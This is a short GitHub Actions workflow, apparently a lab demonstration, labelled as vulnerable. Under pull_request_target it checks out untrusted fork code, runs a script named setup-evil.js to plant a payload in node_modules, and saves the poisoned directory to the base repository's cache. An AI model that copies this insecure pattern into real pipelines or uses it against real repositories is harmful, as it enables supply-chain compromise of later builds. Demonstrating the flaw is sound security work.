name: PR Check (VULNERABLE)
on:
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: "[ATTACKER] Checkout PR fork code"
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: "[ATTACKER] Plant malicious payload"
        run: |
          node setup-evil.js
          echo "--- node_modules after plant ---"
          find node_modules -name "*.js" 2>/dev/null | head -5
          echo "--- content of helper ---"
          cat node_modules/helper/index.js | head -5

      - name: "[VULN] Save poisoned cache to base repo"
        uses: actions/cache/save@v4
        with:
          path: node_modules
          key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}
